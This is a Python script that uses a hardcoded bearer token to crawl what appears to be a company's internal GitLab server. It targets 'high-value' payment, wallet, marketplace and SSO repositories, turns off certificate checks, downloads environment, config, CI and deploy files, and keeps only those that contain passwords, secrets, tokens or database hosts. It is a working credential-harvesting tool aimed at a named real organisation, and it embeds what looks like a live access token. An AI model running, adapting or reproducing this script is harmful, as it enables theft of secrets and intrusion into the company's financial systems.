"""Fetch config/env/deploy files from high-value GitLab repos."""
import json, urllib.request, urllib.parse, ssl, io, sys, os, base64

sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")
ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
TOK = "c07d2c6e0df60d71bfe5fc6bd2b024fa3c66fc3bf319923b4e8bddda445e890e"
HERE = os.path.dirname(os.path.abspath(__file__))
OUT = os.path.join(HERE, "nexus_image_secrets", "gitlab_configs")
os.makedirs(OUT, exist_ok=True)


def api(path, raw=False):
    r = urllib.request.Request("https://gitlab.dev.claroshop.com/api/v4" + path,
                               headers={"Authorization": "Bearer " + TOK})
    data = urllib.request.urlopen(r, timeout=30, context=ctx).read()
    return data if raw else json.loads(data)


import re as _re
WANT = _re.compile(
    r"(^|/)(\.env|\.env\.[a-z]+|config\.php|database\.php|databases\.php|app\.php|"
    r"dockerfile|\.gitlab-ci\.yml|jenkinsfile|docker-compose.*\.yml|deploy.*\.(sh|yml|yaml)|"
    r"application.*\.(properties|yml|yaml)|bootstrap\.yml|settings\.xml|"
    r"deploymentconfig.*\.yml|dc\.yml|.*-dc\.yml|secret.*\.yml)$", _re.I)

projs = json.load(open(os.path.join(HERE, "gitlab_projects_all.json"), encoding="utf-8"))
HV = ["monedero", "t1pagos", "payment", "caja", "axii", "tienda", "fincado",
      "marketplace", "core_claroenvios", "t1envios", "sears/api", "sears/tienda",
      "sanborns/tienda", "conciliacion", "sso"]
targets = [p for p in projs if any(k in p["path"].lower() for k in HV)]
print(f"HV TARGETS: {len(targets)}")

found = []
for p in targets:
    pid, path = p["id"], p["path"]
    try:
        tree = api(f"/projects/{pid}/repository/tree?recursive=true&per_page=100")
    except Exception as e:
        print(f"[ERR tree] {path}: {e}")
        continue
    files = [t["path"] for t in tree if t["type"] == "blob" and WANT.search(t["path"])]
    for fp in files[:12]:
        try:
            content = api(f"/projects/{pid}/repository/files/{urllib.parse.quote(fp, safe='')}/raw?ref=master", raw=True)
        except Exception:
            try:
                content = api(f"/projects/{pid}/repository/files/{urllib.parse.quote(fp, safe='')}/raw?ref=develop", raw=True)
            except Exception as e2:
                continue
        text = content.decode("utf-8", errors="replace")
        # only save if it has something juicy or is a ci/docker file
        if _re.search(r"(?i)(password|secret|token|registry|image:|db_|host|3306|3308|3310|27017|nexus)", text):
            safe = _re.sub(r"[^A-Za-z0-9_.-]", "_", f"{path}__{fp}")
            with open(os.path.join(OUT, safe), "w", encoding="utf-8", newline="\n") as f:
                f.write(text)
            found.append((path, fp, len(text)))
            print(f"[SAVE] {path} :: {fp} ({len(text)}b)")

print(f"\nTOTAL SAVED: {len(found)} -> {OUT}")
